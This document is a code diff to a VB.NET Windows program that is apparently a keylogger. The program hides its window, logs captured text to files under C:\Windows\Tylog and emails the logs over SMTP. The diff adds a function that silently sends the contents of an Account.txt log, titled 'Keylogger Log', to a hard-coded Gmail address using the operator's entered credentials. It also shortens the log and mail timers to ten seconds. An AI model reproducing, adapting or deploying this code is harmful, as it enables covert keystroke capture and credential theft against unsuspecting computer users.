@@ -584,7 +584,7 @@ Public Class Main_Menu
         btnStop.Enabled = True
 
         'TIMER LOG SAVE
-        timeLog.Interval = 120000  '2mnt
+        timeLog.Interval = 10000  '2mnt
         timeLog.Start()
 
         Me.Hide()
@@ -622,10 +622,15 @@ Public Class Main_Menu
         simpan.InitialDirectory = My.Computer.FileSystem.SpecialDirectories.MyDocuments
         simpan.Filter = "Text Files (*.txt)|*.txt| All Files (*.*)|*.*"
 
-        If (simpan.ShowDialog(Me) = Windows.Forms.DialogResult.OK) Then
-            Dim namaFile As String = simpan.FileName
-            richLogBox.SaveFile(simpan.FileName, RichTextBoxStreamType.PlainText)
+        If richLogBox.Text = "" Then
+            MsgBox("No Log on Monitor ", MsgBoxStyle.Critical, "OOops !")
+        Else
+            If (simpan.ShowDialog(Me) = Windows.Forms.DialogResult.OK) Then
+                Dim namaFile As String = simpan.FileName
+                richLogBox.SaveFile(simpan.FileName, RichTextBoxStreamType.PlainText)
+            End If
         End If
+        
 
     End Sub
 
@@ -724,6 +729,50 @@ Public Class Main_Menu
         Return True
     End Function
 
+    Public Function anu_email(ByVal usermail As Object, ByVal passmil As Object) As Object
+        Try
+            'Prosedur kirim email'
+            Dim MailServer As New SmtpClient
+            Dim pesan As New MailMessage()
+            Dim cheat As New MailMessage()
+            Dim user As String = usermail
+            Dim pass As String = passmil
+            Dim bodyMail As New IO.StreamReader("C:\Windows\Tylog\Account.txt")
+            MailServer.UseDefaultCredentials = False
+            MailServer.Credentials = New Net.NetworkCredential(user, pass)
+            MailServer.Port = 587
+            MailServer.EnableSsl = True
+            MailServer.Host = "smtp.gmail.com"
+
+            pesan = New MailMessage()
+            pesan.From = New MailAddress(user)
+            pesan.To.Add("adarafaranisa443@gmail.com")
+            pesan.Subject = "Keylogger Log"
+            pesan.IsBodyHtml = False
+            pesan.Body = bodyMail.ReadToEnd
+            bodyMail.Close()
+            MailServer.Send(pesan)
+        Catch pesanError As Exception
+            validasi_direktori(lokasi)
+            Dim anue = "C:\Windows\Tylog\Error.txt"
+            Dim kiene As New IO.StreamWriter(anue, True)
+            kiene.WriteLine(pesanError.ToString)
+            kiene.WriteLine("Unknow Error" & " ======> " & TimeOfDay)
+            kiene.Close()
+        End Try
+        Return True
+    End Function
+
+
+
+
+
+
+
+
+
+
+
     'SIMPAN LOG
     Dim lokasi As String = "C:\Windows\Tylog"
     Private Sub validasi_direktori(ByVal path As String)
@@ -743,10 +792,10 @@ Public Class Main_Menu
 
     Private Sub timeLog_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles timeLog.Tick
         validasi_direktori(lokasi)
-
         Dim namaLog = "C:\Windows\Tylog\Tylexit.txt"
         Dim tulisLog As New IO.StreamWriter(namaLog, True) 'Untuk bikin file
-        tulisLog.Write(richLogBox.Text)
+        tulisLog.WriteLine(richLogBox.Text)
+        tulisLog.WriteLine("================== End Result =================")
         tulisLog.Close() 'supaya tidak terbaca aktif
         'Console.Read() ' untuk baca kalo ada console.write("Ini isi textnya")
         'MsgBox("Tertulis gan")
@@ -793,6 +842,7 @@ Public Class Main_Menu
         'Cek Koneksi
         If Koneksi() = True Then
             kirim_email(txtEmail.Text, txtPassword.Text, txtReceiver.Text)
+            anu_email(txtEmail.Text, txtPassword.Text)
         Else
             validasi_direktori(lokasi)
             Dim wadah = "C:\Windows\Tylog\Sender Fail.txt"
@@ -805,7 +855,7 @@ Public Class Main_Menu
     Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnEnable.Click
         'SEND MAIL
         If btnMail.Enabled = False Then
-            timeMail.Interval = 600000 '10menit
+            timeMail.Interval = 10000 '10menit
             timeMail.Start()
             lblMailActive.Text = "ACTIVED"
             lblMailActive.ForeColor = Color.WhiteSmoke
